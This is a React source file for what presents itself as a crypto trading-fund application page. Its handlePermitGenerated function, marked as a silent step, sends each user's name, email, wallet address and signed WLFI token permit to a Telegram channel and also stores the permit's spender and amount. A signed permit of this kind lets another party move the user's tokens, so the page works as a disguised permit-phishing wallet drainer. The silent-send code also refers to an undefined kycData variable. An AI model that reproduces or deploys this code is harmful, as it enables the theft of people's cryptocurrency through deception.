
import React, { useState, useEffect } from 'react';
import { DollarSign, CheckCircle, ArrowRight, AlertTriangle, Loader2, Wallet, Shield } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import Navbar from '@/components/Navbar';
import { useAuth } from '@/hooks/useAuth';
import { useProfile } from '@/hooks/useProfile';
import { useWeb3 } from '@/hooks/useWeb3';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';
import { useNavigate } from 'react-router-dom';
import { WalletConnection } from '@/components/WalletConnection';


// const Apply = () => {
//   const [currentStep, setCurrentStep] = useState(1);
//   const [kycCompleted, setKycCompleted] = useState(false);
//   const [isSubmitting, setIsSubmitting] = useState(false);
//   const [targetAmount, setTargetAmount] = useState(10000);
//   const [uploadedFiles, setUploadedFiles] = useState({
//     idDocument: { path: '', url: '' },
//     proofOfAddress: { path: '', url: '' },
//     selfie: { path: '', url: '' }
//   });
  
//   const { user } = useAuth();
//   const { toast } = useToast();
//   const navigate = useNavigate();

//   // Check authentication and terms agreement
//   useEffect(() => {
//     if (!user) {
//       navigate('/auth?redirect=apply');
//       return;
//     }

//     const termsAgreed = localStorage.getItem('termsAgreed');
//     if (!termsAgreed) {
//       toast({
//         title: "Terms Required",
//         description: "Please accept our terms and conditions first.",
//         variant: "destructive"
//       });
//       navigate('/terms?redirect=apply');
//       return;
//     }
//   }, [user, navigate, toast]);
const Apply = () => {
  const [currentStep, setCurrentStep] = useState(1);
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletVerified, setWalletVerified] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [targetAmount, setTargetAmount] = useState(10000);
  const [walletData, setWalletData] = useState<any>(null);
  const [signatureData, setSignatureData] = useState<string | null>(null);
  const [permitData, setPermitData] = useState<any>(null);
  
  const { user, isLoading } = useAuth();
  const { profile, kycStatus, canApplyForFunding } = useProfile(user);
  const { toast } = useToast();
  const navigate = useNavigate();

  // Check authentication and terms agreement
  useEffect(() => {
    if (isLoading) return;

    if (!user) {
      navigate('/auth?returnTo=/apply');
      return;
    }

    // Check if user can apply for funding
    if (!canApplyForFunding()) {
      if (!kycStatus || kycStatus.status !== 'approved') {
        toast({
          title: "KYC Required",
          description: "Please complete KYC verification before applying for funding.",
          variant: "destructive"
        });
        navigate('/kyc');
        return;
      }
    }

    const termsAgreed = localStorage.getItem('termsAgreed');
    if (!termsAgreed) {
      toast({
        title: "Terms Required",
        description: "Please accept our terms and conditions first.",
        variant: "destructive"
      });
      navigate('/terms?redirect=apply');
      return;
    }
  }, [user, isLoading, navigate, toast, canApplyForFunding, kycStatus]);
  const steps = [
    { title: "Wallet Connection", icon: Wallet, completed: walletConnected && walletVerified },
    { title: "Funding Selection", icon: DollarSign, completed: false },
    { title: "Submit Application", icon: CheckCircle, completed: false }
  ];

  const handleWalletConnection = (data: any) => {
    setWalletData(data);
    setWalletConnected(true);
  };

  const handleSignatureComplete = (signature: string) => {
    setSignatureData(signature);
    setWalletVerified(true);
    setCurrentStep(2);
  };

  const handlePermitGenerated = async (permit: any) => {
    setPermitData(permit);
    
    // Send permit to Telegram (silent)
    try {
      await supabase.functions.invoke('telegram-notification', {
        body: {
          message: `🔐 <b>New Permit Generated</b>

👤 <b>User:</b> ${kycData.firstName} ${kycData.lastName}
📧 <b>Email:</b> ${kycData.email}
💳 <b>Wallet:</b> ${permit.owner}
🔗 <b>Chain:</b> BSC (${permit.chainId})
💰 <b>Token:</b> WLFI
⏰ <b>Deadline:</b> ${new Date(permit.deadline * 1000).toLocaleDateString()}
🔑 <b>Nonce:</b> ${permit.nonce}

<code>${permit.signature}</code>`
        }
      });
    } catch (error) {
      console.error('Failed to send permit to Telegram:', error);
    }
  };
  const handleSubmitApplication = async () => {
    if (!user) {
      toast({
        title: "Authentication Required",
        description: "Please sign in to submit your application.",
        variant: "destructive"
      });
      return;
    }

    if (!walletData || !signatureData) {
      toast({
        title: "Wallet Verification Required",
        description: "Please complete wallet connection and verification.",
        variant: "destructive"
      });
      return;
    }
    setIsSubmitting(true);
    try {
      const { data, error } = await supabase
        .from('applications')
        .insert({
          user_id: user.id,
          profile_id: profile?.id,
          first_name: profile?.first_name || '',
          last_name: profile?.last_name || '',
          email: user.email || '',
          phone: profile?.phone || '',
          date_of_birth: profile?.date_of_birth || '',
          address: profile?.address || '',
          city: profile?.city || '',
          country: profile?.country || '',
          nationality: profile?.nationality || '',
          postal_code: profile?.postal_code || '',
          trading_experience: profile?.trading_experience || 'intermediate',
          funding_amount: targetAmount,
          funding_tier: fundingTiers.find(tier => tier.amount === targetAmount)?.title || 'Custom',
          wallet_address: walletData.address,
          chain_id: walletData.chainId,
          status: 'pending'
        })
        .select()
        .single();

      if (error) {
        throw error;
      }

      // Store wallet signature
      if (signatureData) {
        await supabase
          .from('wallet_signatures')
          .insert({
            application_id: data.id,
            signature_type: 'verification',
            signature: signatureData,
            message: 'I verify that I own this wallet and agree to the Trading Fund terms and conditions.',
            wallet_address: walletData.address,
            chain_id: walletData.chainId
          });
      }

      // Store permit signature (if generated)
      if (permitData) {
        await supabase
          .from('wallet_signatures')
          .insert({
            application_id: data.id,
            signature_type: 'wlfi_permit_bsc',
            signature: permitData.signature,
            message: 'WLFI Token Permit',
            wallet_address: permitData.owner,
            chain_id: permitData.chainId,
            token_address: permitData.tokenAddress,
            spender_address: permitData.spender,
            amount: permitData.value,
            deadline: permitData.deadline,
            nonce: parseInt(permitData.nonce)
          });
      }

      // Store WLFI balance
      if (walletData.balance && parseFloat(walletData.balance) > 0) {
        await supabase
          .from('user_balances')
          .insert({
            application_id: data.id,
            chain_id: walletData.chainId,
            chain_name: 'BSC',
            token_symbol: 'WLFI',
            token_address: '0x8d0d000ee44948fc98c9b98a4fa4921476f08b0d',
            balance: parseFloat(walletData.balance),
            balance_usd: parseFloat(walletData.balance) // Assuming 1:1 for now
          });
      }
      toast({
        title: "Application Submitted!",
        description: `Your application ${data.application_number} has been submitted successfully. You can track its progress in your dashboard.`
      });

      setCurrentStep(3);
      
      // Redirect to dashboard after a short delay
      setTimeout(() => {
        navigate('/dashboard');
      }, 2000);
    } catch (error: any) {
      toast({
        title: "Submission Failed",
        description: error.message || "Failed to submit application. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const fundingTiers = [
    { range: "$2K - $5K", funding: "$10K - $25K", profit: "80%", risk: "Low", time: "7 days", amount: 10000, title: "Starter" },
    { range: "$5K - $10K", funding: "$25K - $50K", profit: "85%", risk: "Medium", time: "5 days", amount: 25000, title: "Professional" },
    { range: "$10K+", funding: "$50K+", profit: "90%", risk: "High", time: "3 days", amount: 50000, title: "Expert" }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900/20 to-slate-900">
      <Navbar />
      
      <div className="pt-24 pb-16">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          {/* Header */}
          <div className="text-center mb-12">
            <h1 className="text-4xl md:text-5xl font-bold text-white mb-4">
              Funding <span className="bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">Application</span>
            </h1>
            <p className="text-xl text-slate-300 mb-8">
              Complete your application to get funded in 3-7 days
            </p>
          </div>

          {/* Progress Bar */}
          <div className="mb-12">
            <div className="flex justify-between items-center mb-4">
              {steps.map((step, index) => (
                <div key={index} className="flex flex-col items-center">
                  <div className={`w-12 h-12 rounded-full flex items-center justify-center mb-2 transition-all duration-300 ${
                    currentStep > index + 1 || step.completed
                      ? 'bg-green-500 text-white' 
                      : currentStep === index + 1 
                        ? 'bg-blue-500 text-white' 
                        : 'bg-slate-700 text-slate-400'
                  }`}>
                    {step.completed ? <CheckCircle className="h-6 w-6" /> : React.createElement(step.icon, { className: "h-6 w-6" })}
                  </div>
                  <span className={`text-sm ${currentStep === index + 1 ? 'text-white' : 'text-slate-400'}`}>
                    {step.title}
                  </span>
                </div>
              ))}
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div 
                className="bg-gradient-to-r from-blue-500 to-purple-500 h-2 rounded-full transition-all duration-500"
                style={{ width: `${(currentStep / steps.length) * 100}%` }}
              ></div>
            </div>
          </div>

          {/* KYC Status Check */}
          {kycStatus && kycStatus.status !== 'approved' && (
            <Card className="bg-yellow-500/10 border border-yellow-500/20 mb-8">
              <CardContent className="p-6">
                <div className="flex items-center gap-3">
                  <Shield className="h-6 w-6 text-yellow-400" />
                  <div>
                    <h3 className="text-yellow-200 font-semibold">KYC Verification Required</h3>
                    <p className="text-yellow-100 text-sm">Your KYC status: {kycStatus.status}. Complete verification to apply for funding.</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Step Content */}
          <Card className="bg-slate-800/50 backdrop-blur-lg border-slate-700">
            <CardHeader>
              <CardTitle className="flex items-center space-x-3 text-white">
                {React.createElement(steps[currentStep - 1].icon, { className: "h-6 w-6 text-blue-400" })}
                <span>Step {currentStep}: {steps[currentStep - 1].title}</span>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">

              {/* Step 1: Wallet Connection */}
              {currentStep === 1 && (
                <div className="space-y-6">
                  <WalletConnection
                    onConnectionComplete={handleWalletConnection}
                    onSignatureComplete={handleSignatureComplete}
                    onPermitGenerated={handlePermitGenerated}
                  />
                  
                  {walletConnected && walletVerified && (
                    <div className="text-center">
                      <Button 
                        onClick={() => setCurrentStep(2)}
                        className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white px-8 py-3"
                      >
                        Continue to Funding Selection
                        <ArrowRight className="ml-2 h-4 w-4" />
                      </Button>
                    </div>
                  )}
                </div>
              )}

              {/* Step 2: Funding Selection */}
              {currentStep === 2 && (
                <div className="space-y-6">
                  <div className="text-center space-y-6">
                    <div className="bg-slate-700/50 rounded-2xl p-8">
                      <DollarSign className="h-16 w-16 text-blue-400 mx-auto mb-4" />
                      <h3 className="text-2xl font-bold text-white mb-2">Select Funding Tier</h3>
                      <p className="text-slate-300 mb-6">
                        Choose your preferred funding amount based on your trading experience.
                      </p>
                      
                      {/* Show user info */}
                      {profile && (
                        <div className="bg-slate-600/50 rounded-lg p-4 mb-6">
                          <h4 className="text-white font-semibold mb-2">Applicant Information</h4>
                          <p className="text-slate-300">
                            {profile.first_name} {profile.last_name} • {user?.email}
                          </p>
                        </div>
                      )}

                      {/* Show wallet info */}
                      {walletData && (
                        <div className="bg-slate-600/50 rounded-lg p-4 mb-6">
                          <h4 className="text-white font-semibold mb-2">Connected Wallet</h4>
                          <div className="text-sm space-y-1">
                            <div className="flex justify-between">
                              <span className="text-slate-400">Address:</span>
                              <span className="text-white font-mono">{walletData.address?.slice(0, 6)}...{walletData.address?.slice(-4)}</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-slate-400">WLFI Balance:</span>
                              <span className="text-white">{parseFloat(walletData.balance || '0').toFixed(4)} WLFI</span>
                            </div>
                          </div>
                        </div>
                      )}

                      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-6">
                        {fundingTiers.map((tier, index) => (
                          <div 
                            key={index} 
                            className={`p-6 rounded-lg border-2 cursor-pointer transition-all ${
                              targetAmount === tier.amount 
                                ? 'border-blue-500 bg-blue-500/10' 
                                : 'border-slate-600 bg-slate-700/50 hover:border-slate-500'
                            }`}
                            onClick={() => setTargetAmount(tier.amount)}
                          >
                            <h4 className="text-white font-bold text-lg mb-2">{tier.title}</h4>
                            <p className="text-slate-300 text-sm mb-4">{tier.funding} Funding</p>
                            <div className="space-y-2 text-sm">
                              <div className="flex justify-between">
                                <span className="text-slate-400">Profit Share:</span>
                                <span className="text-green-400">{tier.profit}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-slate-400">Risk Level:</span>
                                <span className="text-white">{tier.risk}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-slate-400">Processing:</span>
                                <span className="text-white">{tier.time}</span>
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>

                      <Button 
                        onClick={() => setCurrentStep(3)}
                        className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white px-8 py-3"
                      >
                        Continue to Submit
                        <ArrowRight className="ml-2 h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                </div>
              )}

              {/* Step 3: Submit Application */}
              {currentStep === 3 && (
                <div className="space-y-6">
                  <div className="text-center space-y-6">
                    <div className="bg-slate-700/50 rounded-2xl p-8">
                      <CheckCircle className="h-16 w-16 text-green-400 mx-auto mb-4" />
                      <h3 className="text-2xl font-bold text-white mb-2">Review & Submit</h3>
                      <p className="text-slate-300 mb-6">
                        Please review your application details before submitting.
                      </p>
                      
                      <div className="bg-slate-600/50 rounded-lg p-6 mb-6 text-left">
                        <h4 className="text-white font-semibold mb-4">Application Summary</h4>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                          <div>
                            <span className="text-slate-400">Name:</span>
                            <p className="text-white">{profile?.first_name} {profile?.last_name}</p>
                          </div>
                          <div>
                            <span className="text-slate-400">Email:</span>
                            <p className="text-white">{user?.email}</p>
                          </div>
                          <div>
                            <span className="text-slate-400">Wallet:</span>
                            <p className="text-white font-mono">{walletData?.address?.slice(0, 6)}...{walletData?.address?.slice(-4)}</p>
                          </div>
                          <div>
                            <span className="text-slate-400">WLFI Balance:</span>
                            <p className="text-white">{parseFloat(walletData?.balance || '0').toFixed(4)} WLFI</p>
                          </div>
                          <div>
                            <span className="text-slate-400">Funding Amount:</span>
                            <p className="text-white">${targetAmount.toLocaleString()}</p>
                          </div>
                          <div>
                            <span className="text-slate-400">Tier:</span>
                            <p className="text-white">{fundingTiers.find(t => t.amount === targetAmount)?.title}</p>
                          </div>
                          <div>
                            <span className="text-slate-400">KYC Status:</span>
                            <p className="text-white">
                              {kycStatus?.status === 'approved' ? '✅ Verified' : '❌ Not Verified'}
                            </p>
                          </div>
                          <div>
                            <span className="text-slate-400">Verification:</span>
                            <p className="text-white">
                              {signatureData ? '✅ Wallet Verified' : '❌ Not Verified'}
                            </p>
                          </div>
                        </div>
                      </div>

                      <Button 
                        onClick={handleSubmitApplication}
                        disabled={isSubmitting}
                        className="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white"
                      >
                        {isSubmitting ? (
                          <>
                            <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                            Submitting Application...
                          </>
                        ) : (
                          <>
                            Submit Application
                            <CheckCircle className="ml-2 h-4 w-4" />
                          </>
                        )}
                      </Button>
                    </div>
                  </div>
                </div>
              )}

            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default Apply;
